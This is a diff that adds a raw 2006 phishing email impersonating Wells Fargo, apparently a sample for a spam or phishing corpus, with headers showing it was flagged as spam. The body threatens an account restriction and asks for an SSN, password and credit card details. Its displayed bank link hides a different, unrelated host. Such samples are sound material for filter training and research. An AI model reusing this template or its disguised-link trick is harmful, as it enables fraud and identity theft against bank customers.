@@ -1,0 +1,89 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <www-data@chicago170.server4you.de>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (unknown [152.160.49.220])
+ by example.com (Postfix) with ESMTP id 8A299468BF
+ for <user@login.example.com>; Fri, 13 Oct 2006 07:22:25 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.example.org (Postfix) with ESMTP id 69418131F899
+ for <user@example.com>; Fri, 13 Oct 2006 07:22:25 -0400 (EDT)
+X-Spam-Flag: YES
+X-Spam-Score: 9.032
+X-Spam-Level: *********
+X-Spam-Status: Yes, score=9.032 tagged_above=-100 required=4
+ tests=[BAYES_60=1, DCC_CHECK=4, FORGED_RCVD_HELO=0.135,
+ HTML_40_50=0.496, HTML_IMAGE_ONLY_24=1.841, HTML_MESSAGE=0.001,
+ MIME_HTML_ONLY=0.001, RCVD_IN_BL_SPAMCOP_NET=1.558]
+Received: from mail.example.org ([127.0.0.1])
+ by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id XLDUPlBSn0Zd for <user@example.com>;
+ Fri, 13 Oct 2006 07:22:21 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP
+ for <user@example.com>; Fri, 13 Oct 2006 07:22:21 -0400 (EDT)
+Received: from chicago170.server4you.de (server.cs-is.net [217.172.179.170])
+ by mail.example.org (Postfix) with ESMTP id DFCB86FAD55
+ for <user@example.com>; Fri, 13 Oct 2006 07:11:35 -0400 (EDT)
+Received: from www-data by chicago170.server4you.de with local (Exim 4.50)
+ id 1GYKrx-0005rE-Hw
+ for user@example.com; Fri, 13 Oct 2006 13:06:25 +0200
+To: user@example.com
+Subject: Urgent Alert : Protect Your Online bank
+From: Wells Fargo Online <     online.banking@wellsfargo.com>
+Reply-To: online.banking@wellsfargo.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1GYKrx-0005rE-Hw@chicago170.server4you.de>
+Date: Fri, 13 Oct 2006 13:06:25 +0200
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 419
+
+                                                                     
+                                                                     
+                                                                     
+                                             
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><META http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body>
+
+
+
+
+
+
+<div>
+<p><img src="https://a248.e.akamai.net/7/248/1856/bb61162e7a787f/www.wellsfargo.com/img/header/logo_62sq.gif">
+  <img src="https://a248.e.akamai.net/7/248/1856/53845d4a1846e7/www.wellsfargo.com/img/header/coach.gif">
+</p>
+<p><strong>Dear Wells Fargo Customer :</strong></p>
+<p>Wells Fargo is constantly working to increase security for all Online Banking
+  users. To ensure the integrity of our online payment system, we periodically
+  review accounts.</p>
+<p>Your account might be place on restricted status. Restricted accounts continue
+  to receive payments, but they are limited in their ability to send or withdraw
+funds.</p>
+<p>To lift up this restriction follow the link bellow and fill in the necessary
+fields:</p>
+<p><a href=" http://lx1server.com/chat/chat_icons/imagwes/.yy/nd/www.wellsfargo.com/www.wellsfargo.com/www.wellsfargo.com/updateyouraccountinformation/ " target="_blank">https://online.wellsfargo.com<WBR>/signon?LOB=CONS</a><br>
+</p>
+<p>It's Easy to Get Started:</p>
+<p>1- sign on with your ssn or username and password .</p>
+<p>2- Update your payment information as it is in our files .</p>
+<p>You must
+confirm your credit card details and your billing information as well . All restricted
+  accounts have their billing information unconfirmed, meaning that you may no
+  longer send money from your account until you have updated your billing information
+on file.</p>
+<p>Have additional questions? Send us an email by clicking on "Contact Us" while   you are signed on to Online Banking, or call 1-800-956-4442. We're available 24   hours a day, 7 days a week.</p>
+<p>Best Regards,</p>
+<p>Matt Lundquist<br>
+Wells Fargo NBBC Sales Development Banker</p>
+</div>
+
+
+</body></html>
+
+
+
